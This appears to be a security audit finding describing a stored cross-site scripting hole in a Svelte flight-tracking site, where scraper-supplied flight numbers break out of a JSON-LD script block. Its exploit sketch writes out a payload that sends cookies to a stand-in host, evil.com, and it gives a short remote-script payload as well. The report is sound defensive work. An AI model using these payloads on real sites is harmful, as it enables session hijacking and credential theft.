---
Phase: 2
Sequence: 002
Slug: json-ld-script-injection-flight-detail
Verdict: VALID
Severity-Original: MEDIUM
Confidence: medium
Anchor: apps/web/src/lib/airports.ts
Anchor-Sha8: b1b2b937
---

## Summary

The flight detail page (`routes/flights/[id]/+page.svelte:233-237`) injects `flight.flightNumber` into a `<script type="application/ld+json">` block via Svelte's `{@html}` directive, using `JSON.stringify` for serialization. However, `JSON.stringify` does **not** escape the `</script>` sequence — it only escapes `"`, `\`, and control characters. If a flight number contains `</script>` (e.g., from a compromised scraper source), it will terminate the script tag and allow arbitrary HTML/JavaScript injection. The `airportName()` function from the anchor file is used in the same page for SEO title/description, but those contexts use Svelte's auto-escaped `{value}` syntax and are not affected.

## Location

- `apps/web/src/routes/flights/[id]/+page.svelte:233-237` — `{@html}` with `JSON.stringify` containing `flight.flightNumber`
- `apps/web/src/routes/flights/[id]/+page.server.ts:15-21` — flight data loaded from DB without sanitization
- `packages/database/schema.ts:47` — `flightNumber: varchar('flight_number', { length: 20 })` (scraper-populated)
- `apps/guernsey-scraper/src/scraper.ts:601-606` — scraper constructs `flightNumber` from external data

## Attacker Control

The attacker would need to inject a `</script>` payload into the `flight_number` column of the `flights` table. This requires:
1. Compromising one of the scraper data sources (Aurigny API, Guernsey Airport, or Flightradar24)
2. OR exploiting a scraper bug that fails to validate flight numbers before insertion

Flight numbers are inserted via the guernsey-scraper (`onConflictDoUpdate` with `flights.uniqueId` target) and position-service. Neither validates the flight number format beyond the database column length constraint (`varchar(20)`).

## Trust Boundary Crossed

Externally-sourced scraper data (flight numbers from airline/airport APIs) crosses into the browser's JavaScript execution context via raw HTML injection (`{@html}`). The data travels: external API → scraper → database → server-side load → client-side Svelte `{@html}` → DOM script context.

## Impact

Stored XSS: when a user views a flight detail page whose flight number contains `</script><script>alert(1)</script>`, the injected JavaScript executes in the airways.gg origin. This enables session hijacking, credential theft, and phishing. The attack requires upstream data compromise but the injection point has no sanitization.

## Evidence

**1. Raw `{@html}` injection with `JSON.stringify`** (`routes/flights/[id]/+page.svelte:233-237`):
```svelte
{@html `<script type="application/ld+json">${JSON.stringify({
    "@context": "https://schema.org",
    "@type": "BreadcrumbList",
    "itemListElement": [
      { "@type": "ListItem", "position": 1, "name": "Guernsey Airport Flights", "item": data.siteUrl },
      { "@type": "ListItem", "position": 2, "name": flight.flightNumber, "item": seoCanonical }
    ]
  })}</script>`}
```

**2. `JSON.stringify` does NOT escape `</script>`** — demo:
```javascript
JSON.stringify("</script><script>alert(1)</script>")
// Result: '"</script><script>alert(1)</script>"'
// The </script> in the string value breaks out of the HTML script tag
```

**3. Flight number stored without validation** (`packages/database/schema.ts:47`):
```typescript
flightNumber: varchar('flight_number', { length: 20 }).notNull(),
```

**4. Scraper inserts flight number from external API response** (`apps/guernsey-scraper/src/scraper.ts:601-606`):
```typescript
const uniqueId = `${primaryCode}_${scrapedFlight.flightDate}_${departureAirport}_${arrivalAirport}`;
const insertSet = {
  uniqueId,
  flightNumber: primaryCode,  // raw value from external API
  ...
};
```

No regex validation, character whitelist, or sanitization is applied to `primaryCode` (the flight number) before insertion.

## Exploit Sketch

1. Attacker compromises or poisons a scraper data source (e.g., Aurigny API response tampering, or FR24 API response manipulation)
2. Scraper inserts a flight with `flightNumber` = `GR</script><script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
3. Victim navigates to `/flights/<id>` for that flight
4. Svelte renders the `{@html}` block, outputting:
   ```html
   <script type="application/ld+json">{"name":"GR</script><script>fetch('https://evil.com/steal?c='+document.cookie)</script>",...}</script>
   ```
5. The HTML parser interprets the first `</script>` as closing the JSON-LD script tag
6. The injected `<script>` tag executes in the airways.gg origin

## Open Questions

- Are there any CSP headers that would block inline scripts? (Not verified — `{@html}`-injected `<script>` tags are typically treated as inline scripts.)
- The `varchar(20)` column limits payload length to 20 characters, but `</script><script>...</script>` with a minimal payload can fit (e.g., `<script/src=//x0.nz>` is 20 chars).
- Are scraper API responses validated or filtered at any point? The scraper code was not exhaustively reviewed for all data paths.
